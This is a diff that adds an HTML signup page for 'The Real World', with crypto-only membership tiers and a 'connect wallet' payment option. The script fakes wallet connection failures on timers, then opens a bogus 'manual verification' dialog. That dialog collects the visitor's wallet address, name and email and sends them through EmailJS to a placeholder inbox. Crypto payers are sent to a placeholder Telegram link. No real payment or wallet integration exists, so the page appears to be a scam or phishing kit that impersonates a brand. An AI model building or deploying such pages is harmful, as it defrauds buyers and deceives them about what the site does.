@@ -1,0 +1,1057 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" type="image/png" href="imgg/OIP.png">
+    <title>Join The Real World</title>
+    <style>
+        /* Base Styles */
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #0a0a0a;
+            color: white;
+            line-height: 1.5;
+            margin: 0;
+            padding: 0;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        /* Header Styles - Right aligned */
+        .header-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 30px;
+        }
+        
+        .header-content {
+            display: flex;
+            align-items: center;
+        }
+        
+        .header-image {
+            width: 70px;
+            height: 70px;
+            margin-right: 15px;
+        }
+        
+        h1 {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 900;
+            font-size: 2.5rem;
+            color: white;
+            text-transform: uppercase;
+            margin: 0;
+            line-height: 1;
+        }
+        
+        h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-weight: 700;
+            font-size: 1.8rem;
+            color: white;
+            text-transform: uppercase;
+            margin: 0;
+            line-height: 1;
+        }
+        
+        /* Main Layout Sections */
+        .main-content {
+            display: flex;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .left-column {
+            width: 35%;
+        }
+        
+        .right-column {
+            width: 65%;
+        }
+        
+        /* Benefits Section */
+        .benefits-section {
+            background-color: #1a1a1a;
+            border-radius: 8px;
+            padding: 20px;
+            border: 1px solid #333;
+            height: 100%;
+        }
+        
+        .benefits-image {
+            width: 100%;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            border: 1px solid #333;
+            max-height: 200px;
+            object-fit: cover;
+        }
+        
+        h3 {
+            font-size: 1.3rem;
+            color: white;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+        
+        .benefits-list {
+            list-style-type: none;
+            font-size: 0.9rem;
+            padding: 0;
+            margin: 0;
+        }
+        
+        .benefits-list li {
+            padding: 8px 0;
+            position: relative;
+            padding-left: 22px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .benefits-list li:before {
+            content: "•";
+            color: #FFD700;
+            font-size: 1.5rem;
+            position: absolute;
+            left: 0;
+            top: 0;
+        }
+        
+        /* Pricing Grid */
+        .pricing-grid {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .pricing-tier {
+            flex: 1;
+            background-color: #1a1a1a;
+            border-radius: 8px;
+            padding: 20px;
+            border: 1px solid #333;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .tier-header {
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #333;
+        }
+        
+        .tier-name {
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: white;
+            text-transform: uppercase;
+            margin-bottom: 8px;
+        }
+        
+        .price {
+            font-weight: 700;
+            font-size: 1.1rem;
+            color: white;
+        }
+        
+        .original-price {
+            text-decoration: line-through;
+            color: #999;
+            font-size: 0.85rem;
+            margin-right: 5px;
+        }
+        
+        .discount-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            color: #000;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-top: 8px;
+        }
+        
+        .features {
+            list-style-type: none;
+            margin-bottom: 20px;
+            padding: 0;
+            flex-grow: 1;
+            font-size: 0.9rem;
+        }
+        
+        .features li {
+            margin-bottom: 6px;
+            position: relative;
+            padding-left: 20px;
+        }
+        
+        .features li:before {
+            content: "✓";
+            position: absolute;
+            left: 0;
+            color: white;
+            font-weight: bold;
+        }
+        
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        
+        .join-crypto-btn, .join-nft-btn {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-weight: 700;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        .join-crypto-btn {
+            background-color: #FFD700;
+            color: #000;
+        }
+        
+        .join-nft-btn {
+            background-color: #3b82f6;
+            color: white;
+        }
+        
+        .join-crypto-btn:hover, .join-nft-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+        }
+        
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-content {
+            background-color: #1a1a1a;
+            border-radius: 10px;
+            padding: 30px;
+            width: 90%;
+            max-width: 800px;
+            border: 1px solid #333;
+            position: relative;
+            animation: slideUp 0.4s ease-out;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        
+        @keyframes slideUp {
+            from { 
+                transform: translateY(20px);
+                opacity: 0;
+            }
+            to { 
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: white;
+            transition: all 0.2s ease;
+        }
+        
+        .close-modal:hover {
+            color: #FFD700;
+        }
+        
+        .modal-title {
+            font-size: 1.5rem;
+            color: white;
+            margin-bottom: 25px;
+            text-align: center;
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        .modal-title:after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 25%;
+            width: 50%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #FFD700, transparent);
+        }
+        
+        .modal-body {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .modal-column {
+            flex: 1;
+        }
+        
+        .modal-section {
+            margin-bottom: 25px;
+        }
+        
+        .modal-section-title {
+            font-size: 1rem;
+            color: #FFD700;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .network-options, .token-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .network-btn, .token-btn {
+            padding: 10px 15px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #0a0a0a;
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 0.9rem;
+        }
+        
+        .network-btn.active, .token-btn.active {
+            border-color: #FFD700;
+            background-color: rgba(255, 215, 0, 0.1);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #0a0a0a;
+            color: white;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            border-color: #FFD700;
+            outline: none;
+        }
+        
+        .price-display {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px;
+            background-color: rgba(255, 215, 0, 0.05);
+            border-radius: 5px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+        }
+        
+        .price-display .amount {
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: #FFD700;
+        }
+        
+        .terms-check {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            font-size: 0.9rem;
+        }
+        
+        .terms-check input {
+            margin-right: 10px;
+            accent-color: #FFD700;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            background-color: #FFD700;
+            color: #000;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .submit-btn:hover {
+            background-color: #FFC000;
+        }
+        
+        /* NFT Modal Specific */
+        .nft-options {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        
+        .nft-option {
+            padding: 15px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background-color: #0a0a0a;
+        }
+        
+        .nft-option:hover {
+            border-color: #3b82f6;
+            background-color: rgba(59, 130, 246, 0.05);
+        }
+        
+        .nft-option.active {
+            border-color: #3b82f6;
+            background-color: rgba(59, 130, 246, 0.1);
+        }
+        
+        .nft-option-title {
+            font-weight: 700;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .nft-option-desc {
+            font-size: 0.8rem;
+            color: #999;
+            padding-left: 25px;
+        }
+        
+        /* Deposit Section */
+        .deposit-section {
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+        
+        .deposit-options {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .deposit-option {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .deposit-option:hover {
+            border-color: #FFD700;
+        }
+        
+        .deposit-option.active {
+            border-color: #FFD700;
+            background-color: rgba(255, 215, 0, 0.05);
+        }
+        
+        /* Footer */
+        footer {
+            text-align: center;
+            color: white;
+            font-size: 0.85rem;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+        
+        /* Loading Spinner */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .fa-spinner {
+            animation: spin 1s linear infinite;
+            margin-right: 8px;
+        }
+        
+        /* Verification Modal */
+        #verificationModal .modal-content {
+            max-width: 500px;
+        }
+        
+        #verificationModal .modal-body {
+            padding: 20px;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 992px) {
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .left-column, .right-column {
+                width: 100%;
+            }
+            
+            .pricing-grid {
+                flex-direction: column;
+            }
+            
+            .header-container {
+                justify-content: center;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .header-image {
+                margin-right: 0;
+                margin-bottom: 15px;
+            }
+            
+            .modal-body {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .modal-content {
+                width: 95%;
+                padding: 20px;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            h2 {
+                font-size: 1.5rem;
+            }
+            
+            .benefits-section {
+                padding: 15px;
+            }
+            
+            .pricing-tier {
+                padding: 15px;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700;900&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <!-- Header with Logo - Right aligned -->
+        <div class="header-container">
+            <div class="header-content">
+                <img src="imgg/imgf.webp" alt="The Real World" class="header-image">
+                <div>
+                    <h1>ESCAPE THE MATRIX</h1>
+                    <h2>JOIN THE REAL WORLDSCHOOL</h2>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Content Section -->
+        <div class="main-content">
+            <!-- Left Column - Benefits -->
+            <div class="left-column">
+                <div class="benefits-section">
+                    <img src="imgg/leftimg.png" alt="Unlock Access" class="benefits-image">
+                    <h3>UNLOCK ACCESS TO...</h3>
+                    <ul class="benefits-list">
+                        <li>Live calls and AMAs with Experts</li>
+                        <li>24/7 Support and on-demand guidance</li>
+                        <li>Over 18 Modern Wealth Creation Methods</li>
+                        <li>7+ Distinct Computers</li>
+                        <li>1000+ Value-Packed Video lessons</li>
+                    </ul>
+                </div>
+            </div>
+            
+            <!-- Right Column - Pricing -->
+            <div class="right-column">
+                <div class="pricing-grid">
+                    <div class="pricing-tier cadet">
+                        <div class="tier-header">
+                            <div class="tier-name">Cadet</div>
+                            <div class="price">$49.99 / month</div>
+                        </div>
+                        <ul class="features">
+                            <li>Access to all TRW Companies</li>
+                            <li>Daily live broadcasts</li>
+                            <li>Daily course updates</li>
+                            <li>5 Connected Devices</li>
+                        </ul>
+                        <div class="button-group">
+                            <button class="join-crypto-btn" data-plan="cadet" data-amount="49.99">
+                                <i class="fab fa-bitcoin"></i> JOIN WITH CRYPTO
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="pricing-tier hero">
+                        <div class="tier-header">
+                            <div class="tier-name">Hero</div>
+                            <div class="price">
+                                <span class="original-price">$49.99</span> $39.99 / month
+                            </div>
+                        </div>
+                        <div class="discount-badge">20% Off Black Yearly</div>
+                        <ul class="features">
+                            <li>All of Cadets</li>
+                            <li>Daily Coin Bonus</li>
+                            <li>Power Level Boost</li>
+                            <li>7 Connected Devices</li>
+                            <li>Campus Graduation Certificate</li>
+                            <li>Access to TRW Job Portal Hiring Opportunities</li>
+                        </ul>
+                        <div class="button-group">
+                            <button class="join-crypto-btn" data-plan="hero" data-amount="39.99">
+                                <i class="fab fa-bitcoin"></i> JOIN WITH CRYPTO
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="pricing-tier champion">
+                        <div class="tier-header">
+                            <div class="tier-name">Champion</div>
+                            <div class="price">
+                                <span class="original-price">$49.99</span> $34.99 / month
+                            </div>
+                        </div>
+                        <div class="discount-badge">30% Off Black Every 2 Years</div>
+                        <ul class="features">
+                            <li>All of Cadets</li>
+                            <li>All of Hero</li>
+                            <li>Maximum Daily Coin Bonus</li>
+                            <li>Big Power Level Boost</li>
+                            <li>Exclusive Champion Only Chairs & Lessons</li>
+                        </ul>
+                        <div class="button-group">
+                            <button class="join-crypto-btn" data-plan="champion" data-amount="34.99">
+                                <i class="fab fa-bitcoin"></i> JOIN WITH CRYPTO
+                            </button>
+                            <button class="join-nft-btn" data-plan="champion" data-amount="34.99">
+                                <i class="fas fa-wallet"></i> JOIN WITH NFT/WALLETCONNECT
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Crypto Payment Modal -->
+        <div class="modal" id="cryptoModal">
+            <div class="modal-content">
+                <span class="close-modal">&times;</span>
+                <h2 class="modal-title">Complete Your Membership</h2>
+                
+                <div class="modal-body">
+                    <div class="modal-column">
+                        <div class="modal-section">
+                            <div class="modal-section-title">Select Network</div>
+                            <div class="network-options">
+                                <div class="network-btn active" data-network="ethereum">Ethereum</div>
+                                <div class="network-btn" data-network="solana">Solana</div>
+                            </div>
+                        </div>
+                        
+                        <div class="modal-section">
+                            <div class="modal-section-title">Select Token</div>
+                            <div class="token-options">
+                                <div class="token-btn active" data-token="usdt-erc20">USDT (ERC-20)</div>
+                                <div class="token-btn" data-token="usdc-erc20">USDC (ERC-20)</div>
+                                <div class="token-btn" data-token="eth-erc20">ETH (ERC-20)</div>
+                            </div>
+                        </div>
+                        
+                        <div class="deposit-section">
+                            <div class="modal-section-title">Deposit Method</div>
+                            <div class="deposit-options">
+                                <div class="deposit-option active">One-Time</div>
+                                <div class="deposit-option">Recurring</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="modal-column">
+                        <div class="modal-section">
+                            <div class="modal-section-title">YOUR INFORMATION</div>
+                            <div class="form-group">
+                                <label for="modal-email">Email address</label>
+                                <input type="email" id="modal-email" placeholder="example@gmail.com">
+                            </div>
+                            <div class="form-group">
+                                <label for="modal-name">Full Name</label>
+                                <input type="text" id="modal-name" placeholder="Full Name">
+                            </div>
+                        </div>
+                        
+                        <div class="price-display">
+                            <div class="amount">$49.99 / month</div>
+                            <div>~49.99 USD</div>
+                        </div>
+                        
+                        <div class="terms-check">
+                            <input type="checkbox" id="modal-terms">
+                            <label for="modal-terms">I accept the Terms and Conditions and Privacy Policy</label>
+                        </div>
+                        
+                        <button class="submit-btn">COMPLETE PAYMENT</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- NFT Payment Modal -->
+        <div class="modal" id="nftModal">
+            <div class="modal-content">
+                <span class="close-modal">&times;</span>
+                <h2 class="modal-title">Connect NFT Wallet</h2>
+                
+                <div class="modal-body">
+                    <div class="modal-column">
+                        <div class="modal-section">
+                            <div class="modal-section-title">Select Wallet Provider</div>
+                            <div class="nft-options">
+                                <div class="nft-option active" data-wallet="metamask">
+                                    <div class="nft-option-title">
+                                        <span>MetaMask</span>
+                                    </div>
+                                    <div class="nft-option-desc">Connect using your MetaMask wallet</div>
+                                </div>
+                                <div class="nft-option" data-wallet="walletconnect">
+                                    <div class="nft-option-title">
+                                        <span>WalletConnect</span>
+                                    </div>
+                                    <div class="nft-option-desc">Scan QR code to connect</div>
+                                </div>
+                                <div class="nft-option" data-wallet="coinbase">
+                                    <div class="nft-option-title">
+                                        <span>Coinbase Wallet</span>
+                                    </div>
+                                    <div class="nft-option-desc">Connect your Coinbase account</div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="deposit-section">
+                            <div class="modal-section-title">Deposit Options</div>
+                            <div class="deposit-options">
+                                <div class="deposit-option active">One-Time</div>
+                                <div class="deposit-option">Recurring</div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="modal-column">
+                        <div class="modal-section">
+                            <div class="modal-section-title">Payment Details</div>
+                            <div class="form-group">
+                                <label for="nft-email">Email address</label>
+                                <input type="email" id="nft-email" placeholder="example@gmail.com">
+                            </div>
+                            <div class="form-group">
+                                <label for="nft-name">Full Name</label>
+                                <input type="text" id="nft-name" placeholder="Full Name">
+                            </div>
+                        </div>
+                        
+                        <div class="price-display">
+                            <div class="amount">$34.99 / month</div>
+                            <div>~34.99 USD</div>
+                        </div>
+                        
+                        <div class="terms-check">
+                            <input type="checkbox" id="nft-terms">
+                            <label for="nft-terms">I accept the Terms and Conditions and Privacy Policy</label>
+                        </div>
+                        
+                        <button class="submit-btn">CONNECT & PAY</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Verification Modal -->
+        <div class="modal" id="verificationModal">
+            <div class="modal-content" style="max-width: 500px;">
+                <span class="close-modal">&times;</span>
+                <h2 class="modal-title">Manual Verification Required</h2>
+                <div class="modal-body">
+                    <p style="margin-bottom: 20px;">We need to verify your WalletConnect account for collectible payments.</p>
+                    <div class="form-group">
+                        <label for="wallet-address">WalletConnect Address</label>
+                        <input type="text" id="wallet-address" placeholder="0x..." required>
+                    </div>
+                    <button class="submit-btn" id="verify-btn">VERIFY WALLET</button>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>Copyright © 2026 The Real World</p>
+        </footer>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your credentials
+        emailjs.init('kUOv0ZnyMXgQQY1yj');
+        
+        document.addEventListener('DOMContentLoaded', function() {
+            // Modal elements
+            const cryptoModal = document.getElementById('cryptoModal');
+            const nftModal = document.getElementById('nftModal');
+            const verificationModal = document.getElementById('verificationModal');
+            const closeButtons = document.querySelectorAll('.close-modal');
+            
+            // Join buttons
+            const cryptoButtons = document.querySelectorAll('.join-crypto-btn');
+            const nftButtons = document.querySelectorAll('.join-nft-btn');
+            
+            // Network and token selection
+            const networkBtns = document.querySelectorAll('.network-btn');
+            const tokenBtns = document.querySelectorAll('.token-btn');
+            const nftOptions = document.querySelectorAll('.nft-option');
+            const depositOptions = document.querySelectorAll('.deposit-option');
+            
+            // Open Modals
+            cryptoButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    cryptoModal.style.display = 'flex';
+                    document.body.style.overflow = 'hidden';
+                    
+                    // Update price display based on clicked button
+                    const amount = this.getAttribute('data-amount');
+                    document.querySelector('#cryptoModal .amount').textContent = `$${amount} / month`;
+                });
+            });
+            
+            nftButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    nftModal.style.display = 'flex';
+                    document.body.style.overflow = 'hidden';
+                    
+                    // Update price display based on clicked button
+                    const amount = this.getAttribute('data-amount');
+                    document.querySelector('#nftModal .amount').textContent = `$${amount} / month`;
+                });
+            });
+            
+            // Close Modals
+            closeButtons.forEach(button => {
+                button.addEventListener('click', function() {
+                    cryptoModal.style.display = 'none';
+                    nftModal.style.display = 'none';
+                    verificationModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                });
+            });
+            
+            // Close when clicking outside
+            window.addEventListener('click', function(event) {
+                if (event.target === cryptoModal || event.target === nftModal || event.target === verificationModal) {
+                    cryptoModal.style.display = 'none';
+                    nftModal.style.display = 'none';
+                    verificationModal.style.display = 'none';
+                    document.body.style.overflow = 'auto';
+                }
+            });
+            
+            // Network selection
+            networkBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    networkBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                });
+            });
+            
+            // Token selection
+            tokenBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    tokenBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                });
+            });
+            
+            // NFT Option selection
+            nftOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    nftOptions.forEach(opt => opt.classList.remove('active'));
+                    this.classList.add('active');
+                });
+            });
+            
+            // Deposit option selection
+            depositOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    const parent = this.parentElement;
+                    parent.querySelectorAll('.deposit-option').forEach(opt => {
+                        opt.classList.remove('active');
+                    });
+                    this.classList.add('active');
+                });
+            });
+            
+            // Payment button handlers
+            document.querySelectorAll('.submit-btn').forEach(btn => {
+                btn.addEventListener('click', async function() {
+                    // Crypto Payment Flow
+                    if(this.closest('#cryptoModal')) {
+                        const amount = document.querySelector('#cryptoModal .amount').textContent;
+                        const email = document.getElementById('modal-email').value;
+                        const name = document.getElementById('modal-name').value;
+                        
+                        if (!email || !name || !document.getElementById('modal-terms').checked) {
+                            alert('Please fill all fields and accept terms');
+                            return;
+                        }
+                        
+                        window.location.href = `https://t.me/yourtelegram?text=${encodeURIComponent('Payment for: ' + amount + '\nName: ' + name + '\nEmail: ' + email)}`;
+                    } 
+                    // NFT Wallet Flow
+                    else if(this.closest('#nftModal')) {
+                        const email = document.getElementById('nft-email').value;
+                        const name = document.getElementById('nft-name').value;
+                        
+                        if (!email || !name || !document.getElementById('nft-terms').checked) {
+                            alert('Please fill all fields and accept terms');
+                            return;
+                        }
+                        
+                        // Show loading state
+                        const originalText = this.textContent;
+                        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CONNECTING...';
+                        this.disabled = true;
+                        
+                        // Add wallet address field if not present
+                        let wcAddressField = document.getElementById('wc-address');
+                        if (!wcAddressField) {
+                            const formGroup = document.createElement('div');
+                            formGroup.className = 'form-group';
+                            formGroup.innerHTML = `
+                                <label for="wc-address">WalletConnect Address</label>
+                                <input type="text" id="wc-address" placeholder="0x..." required>
+                            `;
+                            document.querySelector('#nftModal .modal-column:last-child').insertBefore(
+                                formGroup, 
+                                document.querySelector('#nftModal .terms-check')
+                            );
+                        }
+                        
+                        // First attempt (7 seconds)
+                        setTimeout(() => {
+                            this.innerHTML = originalText;
+                            this.disabled = false;
+                            alert('CONNECTION FAILED. Please try again.');
+                            
+                            // Second attempt after 3 seconds
+                            setTimeout(() => {
+                                this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CONNECTING...';
+                                this.disabled = true;
+                                
+                                setTimeout(() => {
+                                    this.innerHTML = originalText;
+                                    this.disabled = false;
+                                    verificationModal.style.display = 'flex';
+                                }, 6000);
+                            }, 3000);
+                        }, 7000);
+                    }
+                    // Verification Flow
+                    else if(this.id === 'verify-btn') {
+                        const walletAddress = document.getElementById('wallet-address').value;
+                        const email = document.getElementById('nft-email').value;
+                        const name = document.getElementById('nft-name').value;
+                        
+                        if (!walletAddress) {
+                            alert('Please enter your wallet address');
+                            return;
+                        }
+                        
+                        // Basic ETH address validation
+                        if (!/^0x[a-fA-F0-9]{40}$/.test(walletAddress)) {
+                            alert('Please enter a valid WalletConnect address');
+                            return;
+                        }
+                        
+                        // Show loading state
+                        const originalText = this.textContent;
+                        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
+                        this.disabled = true;
+                        
+                        try {
+                            // Send verification email
+                            const response = await emailjs.send('service_mclb6ze', 'template_30nlj5e', {
+                                to_email: 'your@verification-email.com',
+                                from_name: name,
+                                from_email: email,
+                                wallet_address: walletAddress,
+                                message: 'New wallet verification request',
+                                date: new Date().toLocaleString()
+                            });
+                            
+                            alert('Verification request sent! We\'ll contact you shortly.');
+                            verificationModal.style.display = 'none';
+                            nftModal.style.display = 'none';
+                        } catch (err) {
+                            alert('Error sending verification: ' + err.message);
+                        } finally {
+                            this.innerHTML = 'VERIFY WALLET';
+                            this.disabled = false;
+                        }
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
